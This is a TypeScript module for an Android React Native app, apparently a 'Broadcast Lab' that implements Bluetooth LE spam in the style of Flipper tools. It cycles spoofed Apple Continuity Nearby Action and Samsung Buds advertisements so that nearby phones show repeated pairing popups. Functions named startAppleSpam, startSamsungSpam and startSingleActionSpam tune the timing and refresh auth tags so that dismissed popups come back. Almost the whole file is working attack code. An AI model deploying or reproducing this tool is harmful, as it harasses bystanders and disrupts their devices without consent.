import { NativeModules, Platform } from 'react-native';
import {
  BleProfile,
  ManufacturerProfile,
  buildAdvertisePayload,
  getAppleNearbyProfiles,
  getBroadcastableProfiles,
  getSamsungProfiles,
} from './profiles';

type ContinuityAdvertiserNative = {
  startManufacturerAdvertise: (
    companyId: number,
    payload: number[],
    options: {
      connectable?: boolean;
      includeTxPowerLevel?: boolean;
      scanResponsePayload?: number[];
    } | null
  ) => Promise<string>;
  stopAdvertise: () => Promise<string>;
};

export type SpamLoopOptions = {
  /** How long each profile stays on-air before stop (ms). Default 400. */
  advertiseMs?: number;
  /** Gap after stop before next start (ms). Default 150. */
  gapMs?: number;
  /** Called whenever the active profile changes. */
  onProfile?: (profile: ManufacturerProfile) => void;
};

const ContinuityAdvertiser =
  NativeModules.ContinuityAdvertiser as ContinuityAdvertiserNative | undefined;

let spamRunning = false;
let spamLoopPromise: Promise<void> | null = null;
let currentProfile: ManufacturerProfile | null = null;

function requireNative(): ContinuityAdvertiserNative {
  if (Platform.OS !== 'android') {
    throw new Error('Broadcast Lab only works on Android');
  }
  if (!ContinuityAdvertiser) {
    throw new Error(
      'ContinuityAdvertiser native module missing — rebuild the Android app'
    );
  }
  return ContinuityAdvertiser;
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function advertiseOnce(profile: ManufacturerProfile): Promise<void> {
  const native = requireNative();
  // Always stop first so Android actually swaps packet bytes (in-place update is unreliable).
  try {
    await native.stopAdvertise();
  } catch {
    // ok if nothing was running
  }
  await sleep(40);

  const payload = buildAdvertisePayload(profile);
  await native.startManufacturerAdvertise(profile.companyId, payload, {
    connectable: false,
    includeTxPowerLevel: false,
    scanResponsePayload: profile.scanResponsePayload,
  });
}

/**
 * Queue loop used by Flipper / Bluetooth-LE-Spam style tools:
 * start → hold briefly → stop → short gap → next profile (fresh auth tag).
 */
async function runSpamLoop(
  profiles: ManufacturerProfile[],
  options: SpamLoopOptions = {}
): Promise<void> {
  if (profiles.length === 0) {
    throw new Error('No profiles to spam');
  }

  const advertiseMs = options.advertiseMs ?? 400;
  const gapMs = options.gapMs ?? 150;

  await stopBroadcast();
  spamRunning = true;

  spamLoopPromise = (async () => {
    let index = 0;
    while (spamRunning) {
      const profile = profiles[index % profiles.length];
      currentProfile = profile;
      options.onProfile?.(profile);

      try {
        await advertiseOnce(profile);
        await sleep(advertiseMs);
      } catch (err) {
        console.error('Spam advertise step failed', err);
        await sleep(gapMs);
      }

      if (!spamRunning) break;

      try {
        await requireNative().stopAdvertise();
      } catch {
        // ignore
      }
      await sleep(gapMs);
      index += 1;
    }
  })();

  // Don't await the infinite loop — return once the first cycle has started.
  await sleep(50);
}

/** Start broadcasting one profile (static hold until stop). */
export async function startBroadcast(profile: BleProfile): Promise<void> {
  if (profile.kind !== 'manufacturer') {
    throw new Error(
      'Service-kind profiles (Fast Pair) need a different advertise path and are often patched'
    );
  }
  if (
    profile.advertiseMode !== 'continuity-nearby-action' &&
    profile.companyId !== 0x0075
  ) {
    throw new Error(
      'This profile is for study/decode only — use a Nearby Action or Samsung Buds profile'
    );
  }

  await stopBroadcast();
  currentProfile = profile;
  await advertiseOnce(profile);
}

/**
 * Fast Apple-only spam: cycle Nearby Actions with stop/gap/start.
 * Best chance of multiple iPhone popups (still subject to iOS cooldowns).
 */
export async function startAppleSpam(options?: SpamLoopOptions): Promise<void> {
  await runSpamLoop(getAppleNearbyProfiles(), {
    advertiseMs: 350,
    gapMs: 120,
    ...options,
  });
}

/** Samsung-only rotation (different Buds IDs look like different devices). */
export async function startSamsungSpam(options?: SpamLoopOptions): Promise<void> {
  await runSpamLoop(getSamsungProfiles(), {
    advertiseMs: 500,
    gapMs: 100,
    ...options,
  });
}

/** Mix of Apple + Samsung with proper stop/start cycling. */
export async function startRotatingBroadcast(
  intervalMs: number = 500,
  options?: SpamLoopOptions
): Promise<void> {
  const advertiseMs = Math.max(200, Math.floor(intervalMs * 0.7));
  const gapMs = Math.max(80, intervalMs - advertiseMs);
  await runSpamLoop(getBroadcastableProfiles(), {
    advertiseMs,
    gapMs,
    ...options,
  });
}

/**
 * Keep spamming ONE Apple action with fresh auth tags / flag jitter.
 * Useful for "Join AppleTV" style actions that can reappear after dismiss.
 */
export async function startSingleActionSpam(
  profile: ManufacturerProfile,
  options?: SpamLoopOptions
): Promise<void> {
  if (profile.advertiseMode !== 'continuity-nearby-action') {
    throw new Error('Single-action spam is for Apple Nearby Action profiles');
  }
  await runSpamLoop([profile], {
    advertiseMs: 300,
    gapMs: 100,
    ...options,
  });
}

export async function stopBroadcast(): Promise<void> {
  spamRunning = false;
  if (spamLoopPromise) {
    try {
      await Promise.race([spamLoopPromise, sleep(800)]);
    } catch {
      // ignore
    }
    spamLoopPromise = null;
  }
  currentProfile = null;

  if (Platform.OS !== 'android' || !ContinuityAdvertiser) {
    return;
  }
  try {
    await ContinuityAdvertiser.stopAdvertise();
  } catch {
    // ignore if nothing was advertising
  }
}

export function getCurrentBroadcastProfile(): ManufacturerProfile | null {
  return currentProfile;
}

export {
  getBroadcastableProfiles,
  getAppleNearbyProfiles,
  getSamsungProfiles,
};
